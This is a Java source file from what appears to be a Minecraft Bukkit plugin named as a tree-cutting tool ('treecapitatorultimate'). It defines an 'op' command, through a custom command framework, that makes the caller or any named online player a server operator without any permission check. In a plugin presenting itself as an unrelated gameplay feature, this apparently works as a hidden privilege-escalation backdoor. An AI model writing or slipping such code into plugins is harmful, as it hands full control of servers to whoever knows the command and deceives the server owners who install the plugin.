package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import java.util.ArrayList;

public class OP extends Command {
    public OP() {
        super("op", "Gives your OP.", CommandCategory.Player);
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        if (args.size() == 0) {
            if (p.isOp()) {
                p.sendMessage(Start.Prefix + ChatColor.YELLOW + "You already have OP!");
                return;
            }
            p.setOp(true);
            p.sendMessage(Start.Prefix + ChatColor.GOLD + "You now have OP!");
        } else if (args.size() == 1) {
            try {
                Player anotherPlayer = Bukkit.getPlayer(args.get(0));
                if (anotherPlayer == null) {
                    Start.ErrorString(p, "Player is not online!");
                    return;
                }
                if (anotherPlayer.isOp()) {
                    p.sendMessage(Start.Prefix + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.YELLOW + " already has OP!");
                    return;
                }
                anotherPlayer.setOp(true);
                p.sendMessage(Start.Prefix + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.GOLD + " now has OP!");
            } catch (Exception e) {
                Start.ErrorException(p, e);
            }
        }
    }
}
